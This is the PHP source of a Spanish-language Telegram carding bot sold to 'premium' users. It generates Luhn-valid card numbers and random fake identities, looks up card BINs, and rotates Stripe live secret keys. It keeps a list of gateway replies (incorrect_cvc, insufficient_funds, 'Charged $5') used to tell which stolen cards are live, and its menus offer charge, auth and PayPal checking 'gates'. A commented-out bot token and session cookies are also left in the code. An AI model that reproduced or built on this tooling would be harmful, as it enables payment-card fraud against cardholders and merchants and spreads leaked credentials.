<?php
//
session_start();
error_reporting(0);
set_time_limit(0);

date_default_timezone_set('America/Buenos_Aires');
$fecha = date("Y/m/d");
//flush();

header("Cache-Control: no-cache, must-revalidate"); // HTTP/1.1
header("Expires: Sat, 26 Jul 1997 05:00:00 GMT"); // Date in the past
header("Pragma: no-cache");

include("config.php");

//------TOKEN DEL BOT MIKASA ACKERMAN--------//
//$token = "5405339405:AAG0kGkeN-8VueVsI2JCLQbHI3wYSnfoG7Y";

$website = "https://api.telegram.org/bot".$token;
$upda = json_decode(file_get_contents('php://input'), true);
$data = file_get_contents("php://input");
$json = json_decode($data, true);
$update = $json["message"];
//---------PERSONAL---------//
$id = $update["from"]["id"];
$Name = $update["from"]["first_name"];
$last = $update["from"]["last_name"];
$message_id = $update["message_id"];
$message = $update["text"];
//----------GRUPOS----------//
$chat_id = $update["chat"]["id"];
$id_new = $update["new_chat_member"]["id"];
$grupo = $update["chat"]["title"];
$nuevo = $update["new_chat_member"]["first_name"]. ' '.$update["new_chat_member"]["last_name"];
//----------------------END VARIABLES----------------------//

$user = $update["from"]["username"];
//------------seguridad-------------//
// ID de tu usuario (para permitir mensajes personales solo para ti)
$myid = "1292171163"; // Reemplaza con tu ID de usuario


//-------------------FUNCIONES------------------//
//sendPv($myid, $data);


$nombres = array("Juan", "María", "Pedro", "Ana", "Carlos", "Luisa", "Jorge", "Sofía");
$nombre = $nombres[rand(0, count($nombres) - 1)];

$fn = array("@gmail.com", "@yahoo.com", "@hotmail.com", "@outlook.com", "@icloud.com", "@mail.com", "@aol.com");
$fin = $fn[rand(0, count($fn) - 1)];
$num = rand(1, 100);
$correo = "$nombre$num$fin";



// Nombres y apellidos de ejemplo
$nombres = ["Liam", "Emma", "Noah", "Olivia", "Aiden", "Sophia"];
$apellidos = ["Smith", "Johnson", "Brown", "Taylor", "Anderson", "Wilson"];
$ciudades = ["Toronto", "Vancouver", "Montreal", "Calgary", "Ottawa"];
$provincias = ["Ontario", "Quebec", "British Columbia", "Alberta", "Nova Scotia"];

// Generar datos aleatorios
$nombre = $nombres[array_rand($nombres)];
$apellido = $apellidos[array_rand($apellidos)];
$correo = strtolower($nombre) . "." . strtolower($apellido) . "".$fin."";
$telefono = "(416) " . rand(100, 999) . "-" . rand(1000, 9999);
$direccion1 = rand(100, 999) . " Main St";
$direccion2 = rand(100, 999) . " Main St";
$ciudad = $ciudades[array_rand($ciudades)];
$zip = strtoupper(chr(rand(65, 90)) . rand(0, 9) . chr(rand(65, 90)) . ' ' . rand(0, 9) . chr(rand(65, 90)) . rand(0, 9));
$provincia = $provincias[array_rand($provincias)];
// Nombres y apellidos de ejemplo
$name = $nombre;
$phone = $telefono;

function capture($string, $start, $end){
$str = explode($start, $string);
$str = explode($end, $str[1]);
 return $str[0];
}
function GetStr($string, $start, $end){
$str = explode($start, $string);
$str = explode($end, $str[1]);
return $str[0];
};

function array_in_string($str, array $arr) {
    foreach($arr as $arr_value) {
        if (stripos($str,$arr_value) !== false)
    return true;
    }
    return false;
}

function Calculate($ccnumber, $length)
    {
        $sum = 0;
        $pos = 0;
        $reversedCCnumber = strrev($ccnumber);

        while ($pos < $length - 1) {
            $odd = $reversedCCnumber[$pos] * 2;
            if ($odd > 9) {
                $odd -= 9;
            }
            $sum += $odd;

            if ($pos != ($length - 2)) {

                $sum += $reversedCCnumber[$pos + 1];
            }
            $pos += 2;
        }

     //   # Calculate check digit
        $checkdigit = ((floor($sum / 10) + 1) * 10 - $sum) % 10;
        $ccnumber .= $checkdigit;
        return $ccnumber;
    }


function BinData($bin){
$curl = curl_init('https://binlist.io/lookup/'.$bin.'');
curl_setopt($curl, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($curl, CURLOPT_FOLLOWLOCATION, true);
$content = curl_exec($curl);
$data = json_decode($content, true);
curl_close($curl);

// Extraer cada uno de los elementos
$iin = $data['number']['iin']; // Número IIN
$length = $data['number']['length']; // Longitud
$luhn = $data['number']['luhn']; // Luhn
$scheme = $data['scheme']; // Esquema
$type = $data['type']; // Tipo
$category = $data['category']; // Categoría
$alpha2 = $data['country']['alpha2']; // Código de país alpha2
$alpha3 = $data['country']['alpha3']; // Código de país alpha3
$country = $data['country']['name']; // Nombre del país
$emoji = $data['country']['emoji']; // Emoji del país
$bank = $data['bank']['name']; // Nombre del banco
$bankPhone = $data['bank']['phone']; // Teléfono del banco
$bankUrl = $data['bank']['url']; // URL del banco
$success = $data['success']; // Estado de éxito
$count = "".$country." - ".$alpha2." ".$emoji."";

if (empty($category)){
   $curl = curl_init('https://bincheck.io/es/details/'.$bin.'');
   curl_setopt($curl, CURLOPT_RETURNTRANSFER, 1);
   curl_setopt($curl, CURLOPT_FOLLOWLOCATION, true);
   $response = curl_exec($curl);
   curl_close($curl);
    //_Nivel de tarjeta_
   preg_match('/Nivel de tarjeta<\/td>\s*<td width="65%" class="p-2">\s*([^<]+)\s*<\/td>/', $response, $matches);
   $category = trim($matches[1]);

}

$type = trim($type);
$bank = trim($bank);

$logo = "<a href='http://t.me/XNazunaBot'>[↯]</a>";


if ($type !== "" ){
$tipo = " - ".$type."";
}
if ($category !== "" ){
$level = " - ".$category."";
}
if ($bank !== "" ){
$banco = "\n".$logo." 𝐁𝐚𝐧𝐤: ".$bank."";
}
$in = "<code>".$bin."</code>";

$bindata = "————✧◦⟮ʙɪɴ ᴅᴀᴛᴀ⟯◦✧————\n".$logo." 𝐁𝐢𝐧: ".$in."\n".$logo." 𝐈𝐧𝐟𝐨: ".$scheme."".$tipo."".$level."\n".$logo." 𝐂𝐨𝐮𝐧𝐭𝐫𝐲: ".$count."".$banco."";
return $bindata;
}

function Bin_Gen_Info($Bin){
$curl = curl_init('https://binlist.io/lookup/'.$Bin.'');
curl_setopt($curl, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($curl, CURLOPT_FOLLOWLOCATION, true);
$content = curl_exec($curl);
$data = json_decode($content, true);
curl_close($curl);
// Extraer cada uno de los elementos
$scheme = $data['scheme']; // Esquema
$type = $data['type']; // Tipo
$category = $data['category']; // Categoría
$alpha2 = $data['country']['alpha2']; // Código de país alpha2
$country = $data['country']['name']; // Nombre del país
$emoji = $data['country']['emoji']; // Emoji del país
$bank = $data['bank']['name']; // Nombre del banco
$count = "".$country." - ".$alpha2." ".$emoji."";

if (empty($category)){
   $curl = curl_init('https://bincheck.io/es/details/'.$Bin.'');
   curl_setopt($curl, CURLOPT_RETURNTRANSFER, 1);
   curl_setopt($curl, CURLOPT_FOLLOWLOCATION, true);
   $response = curl_exec($curl);
   curl_close($curl);
    //_Nivel de tarjeta_
   preg_match('/Nivel de tarjeta<\/td>\s*<td width="65%" class="p-2">\s*([^<]+)\s*<\/td>/', $response, $matches);
   $category = trim($matches[1]);

}

$type = trim($type);
$bank = trim($bank);

$Bin = "<code>".$Bin."</code>";
//$bindata = "━━━━━━━━•⟮ʙɪɴ ᴅᴀᴛᴀ⟯•━━━━━━━\n➭ 𝙱𝙸𝙽: ".$in."\n➭ 𝙱𝚁𝙰𝙽𝙳: ".$scheme."".$tipo."".$level."\n➭ 𝙲𝙾𝚄𝙽𝚃𝚁𝚈: ".$count."".$banco."";
$bingeninfo = "➭ 𝙱𝙸𝙽 𝙸𝙽𝙵𝙾: $scheme - $type - $category\n➭ 𝙱𝙰𝙽𝙺: $bank\n➭ 𝙲𝙾𝚄𝙽𝚃𝚁𝚈: $count\n";

return $bingeninfo;
}

function Bininfo($bin){
$curl = curl_init('https://binlist.io/lookup/'.$bin.'');
curl_setopt($curl, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($curl, CURLOPT_FOLLOWLOCATION, true);
$content = curl_exec($curl);
$data = json_decode($content, true);
curl_close($curl);

// Extraer cada uno de los elementos
$iin = $data['number']['iin']; // Número IIN
$scheme = $data['scheme']; // Esquema
$type = $data['type']; // Tipo
$category = $data['category']; // Categoría
$alpha2 = $data['country']['alpha2']; // Código de país alpha2
$country = $data['country']['name']; // Nombre del país
$emoji = $data['country']['emoji']; // Emoji del país
$bank = $data['bank']['name']; // Nombre del banco
$success = $data['success']; // Estado de éxito

$curl = curl_init();
curl_setopt_array($curl, [
  CURLOPT_URL => 'https://bincheck.io/es/details/'.$bin.'',
  CURLOPT_RETURNTRANSFER => true,
  CURLOPT_ENCODING => '',
  CURLOPT_MAXREDIRS => 10,
  CURLOPT_TIMEOUT => 30,
  CURLOPT_HTTP_VERSION => CURL_HTTP_VERSION_1_1,
  CURLOPT_CUSTOMREQUEST => 'GET',
//  CURLOPT_COOKIE => 'XSRF-TOKEN=eyJpdiI6IlVxQmFHdW1NUkZSYzgyVktnbncyRnc9PSIsInZhbHVlIjoiajZMY09qQlVyQlloR2JiV3JlczEyVnc2ZzM2amZzdWZvdjY4cXN5SlZuQjJpUThrK0hSbTJJdDNtZDkxRWpNOEIxT29TT3EycHFGL1hTMmU2MmwxRTlNT3FRa0M2RXJBallwalJYTGRuSW1SLzU5d3BvYytPQnIrRW5xZG91TVAiLCJtYWMiOiIxZDI2YzFlOGIxZjkzNzIwZTI3M2UzOGJhNDFjZDU3NTBlZmI4YzcxNWMxMGZlM2MwNTRiMWQ4Njk1ZjE2OGViIiwidGFnIjoiIn0%3D; bincheck_session=eyJpdiI6Ii9WbDdYTS9BaXRzWnd5R1JkblpUYlE9PSIsInZhbHVlIjoiOWJlNmJOa0xNTnNWTHlkS2haNncxdlgrMmdIQm1ZRmF4WUVUMkNxdWlUa251QmZyZFVUd1FxSkNNOFdPbmg4bTZYTDI0ejVlcVQ4TE5VQmo2elVrUnpoRmtTVDNNQW5ZV3FKR29mSXorbUlNRXd2OEZCSm53QVJScmJuYmpNSngiLCJtYWMiOiIyZjZhMzZkNzgxMTI1NjE5YTg4YTg2ODY5ZWIyODNjNGQzMDU2NGYzNmIyNTVhNTIzM2UwMTRjNzRiMzNiN2UwIiwidGFnIjoiIn0%3D',
  CURLOPT_HTTPHEADER => [
    'User-Agent: Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Mobile Safari/537.36',
//    'referer: https://bincheck.io/es/details/474340',
  ],
]);

$response = curl_exec($curl);
$err = curl_error($curl);
curl_close($curl);


preg_match('/Nombre del emisor \/ Banco<\/td>\s*<td width="65%" class="p-2">\s*<a[^>]*>([^<]+)<\/a>/', $response, $matches);
$bank1 = trim($matches[1]);
preg_match('/Nombre de país ISO<\/td>\s*<td width="65%" class="p-2">\s*<a[^>]*>([^<]+)<\/a>/', $response, $matches);
$country1 = trim($matches[1]);
preg_match('/Código de país ISO A2<\/td>\s*<td width="65%" class="p-2">([^<]+)<\/td>/', $response, $matches);
$alpha1 = trim($matches[1]);
preg_match('/<td width="35%" class="p-2 font-medium">Nivel de tarjeta<\/td>\s*<td width="65%" class="p-2">([^<]+)<\/td>/', $response, $matches);
$category1 = trim($matches[1]);
preg_match('/Moneda del país ISO<\/td>\s*<td width="65%" class="p-2">\s*<div class="font-medium">([^<]+)<\/div>/', $response, $matches);
$currency = trim($matches[1]);

if ($bank == "UNKNOWN"){
	$bank = $bank1;
}
if (empty($category)){
	$category = $category1;
}

if ($country != $country1) {
$alpha2 = $alpha1;
$country = $country1;
$emoji = '';
}
//$type = trim($type);
//$bank = trim($bank);

$count = "".$country." - ".$alpha2." ".$emoji."";

if ($type !== "" ){
$typo = "\n➭ 𝐓𝐲𝐩𝐞: ".$type."";
}
if ($category !== "" ){
$level = "\n➭ 𝐋𝐞𝐯𝐞𝐥: ".$category."";
}
if (trim($bank !== "" )){
$banco = "\n➭ 𝐁𝐚𝐧𝐤: ".$bank."";
}
if ($currency !== "" ){
$moneda = "\n➭ 𝐂𝐮𝐫𝐫𝐞𝐧𝐜𝐲: 💲".$currency."";
}

$Bin = "<code>".$bin."</code>";
$bininfo = "𝘊𝙤𝙢𝙢𝙖𝙣𝙙 ➟ ʙɪɴ ᴄʜᴇᴄᴋᴇʀ\n- - - - - - - - - - - - - - - - - - - - - - - - - -\n➭ 𝐁𝐢𝐧: ".$Bin."\n➭ 𝐁𝐫𝐚𝐧𝐝: ".$scheme."".$typo."".$level."\n➭ 𝐂𝐨𝐮𝐧𝐭𝐫𝐲: ".$count."".$moneda."".$banco."\n";
//$bininfo = "━━━━━━━•⟮ʙɪɴ ᴄʜᴇᴄᴋᴇʀ⟯•━━━━━━━\n➭ 𝙱𝙸𝙽: ".$Bin."\n➭ 𝙱𝚁𝙰𝙽𝙳: ".$scheme."".$typo."".$level."\n➭ 𝙲𝙾𝚄𝙽𝚃𝚁𝚈: ".$count."".$moneda."".$banco."\n";
return $bininfo;
}
//-----------------------VARIABLES-------------------------//

$live_array = array(
    'incorrect_cvc',
    'Your card zip code is incorrect.',
    'The zip code you supplied failed validation.',
    '"cvc_check":"pass"',
    'Thank You.',
    '"status": "succeeded"',
    'Thank You For Donation.',
    'Success',
    'SUCCEEDED',
    '"cvc_check": "fail"',
    '"cvc_check": "pass"',
    '"status": "succeeded"',
    'Rejected: avs',
    'Your payment has already been processed',
    'Nice! New payment method added',
    'Approved',
    'Charged $5',
    'insufficient_funds',
    'Your card has insufficient funds.',
    "Your card's security code is invalid.",
    "Your card's security code is incorrect.",
    "The card's security code is incorrect.",
    "Your card's expiration month is invalid.",
    'Card Issuer Declined CVV',
    'Credit card expiration date is invalid.',
    'This transaction cannot be processed. Please enter a valid Credit Card Verification Number.',
    'Insufficient Funds',
    'Transaction not permitted by issuer',
    'EXISTING_ACCOUNT_RESTRICTED',
    'VALIDATION_ERROR',
    '3DS authentication is required.',
    '𝑨𝒑𝒑𝒓𝒐𝒗𝒆𝒅!',
    'Insufficient balance',
    'Charged $10',
//    'Your payment method was rejected due to 3D Secure.',
    'transaction_not_allowed',
    'CVV INVALID',
    'incorrect_zip',
    'pickup_card',
    'lost_card',
    'stolen_card',
    '"seller_message": "Payment complete."'
);
/*
$autorizados = array("1292171163");
$grupos_autorizados = array("-4274242125");
*/

if((strpos($message, "!id") === 0)||(strpos($message, "/id") === 0)||(strpos($message, ".id") === 0)){

$json = json_decode($data, true);
$group_id = $json['message']['chat']['id'];
$private_id = $json['message']['from']['id'];
$private_title = $json['message']['from']['first_name'];
$group_title = $json['message']['chat']['title'];
$chat_type = $json['message']['chat']['type'];


echo "$chat_type\n";


if ($private_title == "Channel"){
        $name_title = $group_title;
        $ID = $group_id;
}else{
        $name_title = $private_title;
        $ID = $private_id;
}
$respuesta = "Nombre: ".$name_title."\nChat: ".$chat_type."\nTU ID: <code>".$ID."</code>";
sendMessage($chat_id,$respuesta,$message_id);
die();

}



$archivo = './app/data/Admins.json';
if (file_exists($archivo) && filesize($archivo) > 0) {
    $datos = json_decode(file_get_contents($archivo), true);
    if (count($datos) > 0) {

        $content = file_get_contents('./app/data/Admins.json');
        $data = json_decode($content, true);
        $autorizados = array_column($data, 'id');
//      $id = implode("\n", $autorizados);
    } else {
        echo "El archivo Admins.json está vacío";
    }
} else {
    echo "El archivo Admins.json no existe o está vacío\n";
}

$admin = "<a href='t.me/rigo_jz'>ʀɪɢᴏ ᴊɪᴍᴇɴᴇᴢ</a>";
$logo = "<a href='http://t.me/XNazunaBot'>[↯]</a>";

//-----DATOS DE PRUEBA LOCAL--------//
/*

$chat_id = "1292171163";
$id = "1292171163";

echo "TU CCS: ";
$data = trim(fgets(STDIN));
$message = "!".$data."";
*/
///----+------------------------


// 





if ($myid == $id) {
  $tipo = "ᴀᴅᴍɪɴ";
} elseif (in_array($id, $autorizados)) {
  $tipo = "ᴘʀᴇᴍɪᴜᴍ ᴜsᴇʀ";
} else {
	$tipo = "ғʀᴇᴇ ᴜsᴇʀ";
}







// Verificamos si el mensaje es personal o de grupo
if ($update["from"]["id"] == $myid || in_array($update["from"]["id"], $autorizados) || in_array($update["chat"]["id"], $autorizados)) {
	// Procesar mensaje
} else {
	// Enviar mensaje de error
	$contact = "<a href='t.me/rigo_jz'>ʀɪɢᴏ ᴊɪᴍᴇɴᴇᴢ</a>";
	$respuesta = "━━━━━━━•⟮𝑁𝑎𝑧𝑢𝑛𝑎 𝑁𝑎𝑛𝑎𝑘𝑢𝑠𝑎⟯•━━━━━━━\nHola ".$Name." este bot es premium y para poder acceder a el necesitas una key de autorización.\n\nAdquiérelo yaa!.\n\n".
	'Telegram ➜ '.$contact.'';
	sendMessage($chat_id,$respuesta,$message_id);
	//------MENSAJE PERSONAL-------//
        $personal = "Hola Rigo Jimenez, ".$Name." Intento Acceder a tu Bot";
        sendPv($myid, $personal);
        die();
}

if((strpos($message, "!") === 0)||(strpos($message, "/") === 0)||(strpos($message, ".") === 0)){

$timeout = 60; // Tiempo de espera en segundos
$maxMessages = 3; // Máximo de mensajes permitidos
$file = 'users.txt';
$userId = $id; // Reemplaza con la lógica para obtener el ID del usuario actual

try {
    if (file_exists($file)) {
        $data = json_decode(file_get_contents($file), true);
    } else {
        $data = array();
    }

    if (!isset($data[$userId])) {
        $data[$userId] = array('lastSend' => 0, 'count' => 0);
    }

    $lastSend = $data[$userId]['lastSend'];
    $count = $data[$userId]['count'];
    $diff = time() - $lastSend;

    if ($diff >= $timeout) {
        $count = 0; // Resetear contador después del timeout
    }

    if ($count >= $maxMessages) {
//        $respuesta = '⏳Por favor, espera ' . ($timeout - $diff) . ' segundos antes de enviar otro mensaje.';
	$respuesta = '[ANTI SPAM] Please try again after ' . ($timeout - $diff) . ' seconds.';
        sendMessage($chat_id, $respuesta, $message_id);
 //       echo "$respuesta\n";
        exit;
    }

    // Envía el mensaje...
    $count++;
    $data[$userId] = array('lastSend' => time(), 'count' => $count);
    file_put_contents($file, json_encode($data));
//    echo "Mensaje enviado con éxito.\n";
} catch (Exception $e) {
    echo 'Error: ' . $e->getMessage();
    exit;
}
}



//-------EXTRAE EL SK_LIVE----//
$sk = $config['sk_keys'];
shuffle($sk);
$sec = $sk[0];



unlink("cookie.txt");



	
$file = './app/data/Admins.json';
if (strpos($message, "/vip") === 0) {
	
	if ($id == $myid){
		
	} else {
    // Mensaje de error para IDs no autorizados
		$respuesta = "Acceso restringido!!!";
		sendMessage($chat_id, $respuesta, $message_id);
		die();
	}

	$nombre = '';
	$userId = substr($message, 5);

	if ($userId == $myid) {
		$respuesta = "$userId es el Admin!";
		sendMessage($chat_id, $respuesta, $message_id);
		die();
	}
	
	if (is_numeric($userId) && $userId != '') {
		
		$url = 'https://api.telegram.org/bot' . $token . '/getChat?chat_id=' . $userId;
		$ch = curl_init($url);
		curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
		$response = curl_exec($ch);
		curl_close($ch);

		$userData = json_decode($response, true);
		$type = $userData['result']['type'];

		if ($userData['ok']) {

			if ($type == "private") {
				$nombre = $userData['result']['first_name'] . ' ' . ($userData['result']['last_name'] ?? '');
				$username = $userData['result']['username'] ?? 'No tiene username';
			} elseif (in_array($type, ["group", "supergroup", "channel"])) {
				$nombre = $userData['result']['title'];
				$username = $userData['result']['username'];
			}
		} else {
//        $respuesta = "Error: " . $userData['description'];
			$respuesta = "Usuario no encontrado!!!";
			sendMessage($chat_id, $respuesta, $message_id);
			die();
		}



   // if (is_numeric($userId) && $userId != '') {

		$usersFile = fopen($file, 'r+');
		$usersData = json_decode(fread($usersFile, filesize($file)), true);

		$usersData[$userId] = [
			'id' => $userId,
			'type' => $type,
			'name' => $nombre,
			'username' => $username,
			'premium' => true
			];
		ftruncate($usersFile, 0);
		rewind($usersFile);
		fwrite($usersFile, json_encode($usersData, JSON_PRETTY_PRINT));
		$newContent = json_encode($usersData, JSON_PRETTY_PRINT);
//      echo "$newContent\n";
		Send_data($newContent);
		fclose($usersFile);

		$respuesta = "El usuario ({$userId}) ahora es premium!";
		
	} else {
		$respuesta = "Formato inválido. Use !vip xxxxx";
//echo "$respuesta\n";
	}
	sendMessage($chat_id, $respuesta, $message_id);
	die();
}



function Send_data($newContent) {
    unlink('./app/data/Admins.json');

    $api_token = file_get_contents('/etc/secrets/API_TOKEN');
    $repoName = 'r1gox/CheckerBot';
    $filePath = 'CheckerBot/public/app/data/Admins.json';

    $url = 'https://api.github.com/repos/' . $repoName . '/contents/' . $filePath;
    $headers = array(
        'Authorization: Bearer ' . $api_token,
        'User-Agent: Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Mobile Safari/537.36'
    );

    // Obtener el SHA del archivo existente
    $ch = curl_init($url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
    $response = curl_exec($ch);
    curl_close($ch);
    $fileData = json_decode($response, true);

    // Reemplazar el contenido del archivo
    $data = array(
        'message' => 'Actualizar archivo',
        'content' => base64_encode($newContent),
        'sha' => $fileData['sha']
    );

    $ch = curl_init($url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'PUT');
    curl_setopt($ch, CURLOPT_POSTFIELDS, json_encode($data));
    curl_setopt($ch, CURLOPT_HTTPHEADER, array_merge($headers, ['Content-Type: application/json']));
    $response = curl_exec($ch);
    curl_close($ch);

    sendMessage($chat_id, $response, $message_id);
}




if (strpos($message, "/unvip") === 0) {
    $user = substr($message, 7);
    if (is_numeric($user) && $user != '') {
        $fp = fopen($file, 'r+');
        $content = fread($fp, filesize($file));
        $users = json_decode($content, true);
        unset($users[$user]);
        ftruncate($fp, 0);
        rewind($fp);
        fwrite($fp, json_encode($users, JSON_PRETTY_PRINT));
        fclose($fp);
        $respuesta = "El usuario ($user) ya no es premium.";
    } else {
        $respuesta = "Formato inválido. Use !unvip xxxxx";
    }
    sendMessage($chat_id, $respuesta, $message_id);
    die();
}





$file = file_get_contents('./app/data/Admins.json');

if (strpos($message, "!listvip") === 0) {

    $users = json_decode($file, true);
    $premiums = array_filter($users, function($user) {
        return $user['premium'];
    });

    if (count($premiums) > 0) {
        $respuesta = "♕ ᵁˢᵘᵃʳᶤᵒˢ ᴾʳᵉᵐᶤᵘᵐ ♕\n\n";
        foreach ($premiums as $id => $user) {
            $username = !empty($user['username']) ? "(@{$user['username']})" : '';
            $type = !empty($user['type']) ? " - {$user['type']}" : '';
            $respuesta .= "➩ <code>$id</code> - {$user['name']} $username$type\n";
        }
    } else {
        $respuesta = "No hay usuarios premium.";
    }

    sendMessage($chat_id, $respuesta, $message_id);
    die();
}


/*
if($date <= $users[$id]['date'] + 30 and $users[$id]['msgs'] >= 3){
$respuesta = "[ANTI SPAM] Try again after 30s\n";
*/

if (strpos($message, ".ref") === 0 || strpos($message, "!ref") === 0 || strpos($message, "/ref") === 0) {

$my_id = ($id == "1087968824") ? "1087968824" : "1292171163";

        if ($id == $my_id){

        } else {
               // Mensaje de error para IDs no autorizados
                $respuesta = "Acceso restringido!!!";
                sendMessage($chat_id, $respuesta, $message_id);
                die();
        }


$data = $upda;

$reply_to_message = $data['message']['reply_to_message'];
// Obtener los datos de Alfa
$alfa_data = $reply_to_message['from'];
$user_id = $alfa_data['id'];
$user_username = $alfa_data['username'];
$user_first_name = $alfa_data['first_name'];
$user_last_name = $alfa_data['last_name'];
// Obtener los datos de la foto
$photo_data = $reply_to_message['photo'];
$photo_token = $photo_data[0]['file_id'];
$message = $reply_to_message['caption'];



///ENVIA LA FOTO AL CANAL DE REFERENCIAS//)
//$chat_id = '1292171163'; // reemplaza con el ID del chat
$chat_id_1 = '-1002324412436'; //CANAL DE REFERENCIAS
$chat_id_2 = '-1001697730096'; //CANAL DEL GRUPO

$file_id = $photo_token;
$i = "<a href='https://t.me/ReferenciasAlyaSan'>么</a>";
$descripcion = "<i>Referencias</i> 𝐀𝐥𝐲𝐚-𝐒𝐚𝐧 🔥\n- - - - - - - - - - - - - - - - - - - -\n[$i] <b>Message:</b> $message\n[$i] <b>ID:</b> <code>$user_id</code>\n[$i] <b>Username:</b> @$user_username\n[$i] <b>Name:</b> $user_first_name $user_last_name\n- - - - - - - - - - - - - - - - - - - -\n";



$url = $GLOBALS["website"] . "/sendPhoto";
$ch = curl_init($url);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_POSTFIELDS, array(
    'chat_id' => $chat_id_1,
    'photo' => $file_id,
    'caption' => $descripcion,
    'parse_mode' => 'HTML'
));
$response = curl_exec($ch);
curl_close($ch);

//echo $response;
$response = json_decode($response, true);

if ($response['ok'] == true) {
    $respuesta = "Sent successfully ✅\n";

    sendMessage($chat_id,$respuesta,$message_id);
    sendRefes($chat_id_2, $file_id, $descripcion); //CANAL

} else {
    echo "Error al enviar el mensaje\n";
}

}






//-----BIENVENIDA NUEVO INTEGRANTE------//

//$data = json_decode($json, true);
$data = $upda;

if (isset($data['message']['new_chat_participant']) ||
    isset($data['message']['new_chat_member']) ||
    isset($data['message']['new_chat_members'])) {

    // Un nuevo usuario se ha unido al grupo
    $new_user_id = $data['message']['new_chat_participant']['id'] ??
                   $data['message']['new_chat_member']['id'] ??
                   $data['message']['new_chat_members'][0]['id'];

    $new_user_name = $data['message']['new_chat_participant']['first_name'] ??
                     $data['message']['new_chat_member']['first_name'] ??
                     $data['message']['new_chat_members'][0]['first_name'];

    $new_username = $data['message']['new_chat_participant']['username'] ??
                    $data['message']['new_chat_member']['username'] ??
                    $data['message']['new_chat_members'][0]['username'];
	
    $chat_title = $data['message']['chat']['title'];


//$chat_id = 1292171163; // Reemplaza con el ID del chat donde quieres enviar la foto
$photoID = 'AgACAgEAAxkBAAI1-GcyYUp-dDkeJgZASNIMKESwTVr3AAJ9rTEbRFOYRa60ta4yFkQsAQADAgADcwADNgQ';
$message_id = isset($update['message_id']) ? $update['message_id'] : null; // Obtén el ID del mensaje actual si existe
	
$respuesta =  "¡Hola $new_user_name! Bienvenido/a al Chat de $chat_title.\n\n‣ ᴜsᴇʀ ɪᴅ: <code>$new_user_id</code>\n‣ ғᴜʟʟ ɴᴀᴍᴇ: $new_user_name\n‣ ᴜsᴇʀɴᴀᴍᴇ: @$new_username\n‣ ᴜsᴇʀ ᴛʏᴘᴇ: $tipo\n\nDisfruta de nuestra comunidad y recuerda respetar las reglas para asegurar una experiencia óptima.\n";
sendPhoto($chat_id, $photoID, $respuesta, $message_id);
//sendMessage($chat_id,$respuesta,$message_id);
	
} elseif (isset($data['message']['left_chat_participant']) || isset($data['message']['left_chat_member'])) {
    // Un usuario ha salido del grupo
    $left_user_id = $data['message']['left_chat_participant']['id'] ?? $data['message']['left_chat_member']['id'];
    $left_user_name = $data['message']['left_chat_participant']['first_name'] ?? $data['message']['left_chat_member']['first_name'];
    $left_username = $data['message']['left_chat_participant']['username'] ?? $data['message']['left_chat_member']['username'];
$respuesta =  "¡Hasta luego $left_user_name, nadie te extrañara!\n\n‣ ᴜsᴇʀ ɪᴅ: <code>$left_user_id</code>\n‣ ғᴜʟʟ ɴᴀᴍᴇ: $left_user_name\n‣ ᴜsᴇʀɴᴀᴍᴇ: @$left_username\n";
sendMessage($chat_id,$respuesta,$message_id);
} else {
    // No es un evento de entrada o salida
}



// Start Commands
if (strpos($message, ".start") === 0 || strpos($message, "!start") === 0 || strpos($message, "/start") === 0) {
$respuesta = "─ Checker Panel ─\n\n⁕ Registered as ➞ ".$admin."\n⁕ Use ➞ ".$update["chat"]["type"]." | ".$message1["chat"]["type"]." /cmds to show available commands.\n⁕ Bot by: $admin\n";
sendMessage($chat_id,$respuesta,$message_id);
}
// Cmds Commands
elseif((strpos($message, "!cmds") === 0)||(strpos($message, "/cmds") === 0)||(strpos($message, ".cmds") === 0)) {
        $respuesta = "ᴄʜᴇᴄᴋᴇʀ ᴄᴏᴍᴍᴀɴᴅs\n- - - - - - - - - - - - - - - - - - - - - - - - - -\n➩ Check User Info ✔\n⁕ Usage: /me\n➩ Check ID chat ✔\n⁕ Usage: /id\n➩ List Command Gates ✔\n⁕ Usage: /gts\n\n☆. 𝙴𝚇𝚃𝚁𝙰𝚂 .☆\n- - - - - - - - - -- - - - - - - - - -\n⌦ Bin Check ✔\n⁕ Usage ➟ /bin xxxxxx\n⌦ Checker IBAN ✔\n⁕ Usage ➟ /iban xxxxxx\n⌦ SK Key Check ✔\n⁕ Usage ➟ /sk sk_live_xxxx\n⌦ Gen ccs ✔\n⁕ Usage ➟ /gen xxxxxx\n\n☆. 𝙴𝚇𝚃𝚁𝙰𝙿𝙾𝙻𝙰𝙲𝙸𝙾𝙽 .☆\n- - - - - - - - - -- - - - - - - - - -\n° ᭄ Basica ✔\n⁕ Usage ➟ /extb ᴄᴄs\n° ᭄ Indentacion ✔\n⁕ Usage ➟ /extb ᴄᴄs\n\n⟐ Contact ➜ <a href='t.me/D4rkGh0st3'>ʀɪɢᴏ ᴊɪᴍᴇɴᴇᴢ</a>\n⟐ Bot by ➜ <a href='t.me/D4rkGh0st3'>ʀɪɢᴏ ᴊɪᴍᴇɴᴇᴢ</a>\n";
        sendMessage($chat_id,$respuesta,$message_id);
}

elseif((strpos($message, "!gts") === 0)||(strpos($message, "/gts") === 0)||(strpos($message, ".gts") === 0)) {
        $respuesta = "━━━━•⟮ 𝗖𝗼𝗺𝗺𝗮𝗻𝗱𝘀 𝗚𝗮𝘁𝗲𝘀 ⟯•━━━━\n\n➩ Gates Chargeds ✔\n⁕ Usage: /chds\n➩ Gates Auth ✔\n⁕ Usage: /ats\n➩ Gates PayPal ✔\n⁕ Usage: /pys\n\n⟐ Contact ➜ <a href='t.me/D4rkGh0st3'>ʀɪɢᴏ ᴊɪᴍᴇɴᴇᴢ</a>\n⟐ Bot by ➜ <a href='t.me/D4rkGh0st3'>ʀɪɢᴏ ᴊɪᴍᴇɴᴇᴢ</a>\n";
        sendMessage($chat_id,$respuesta,$message_id);
}

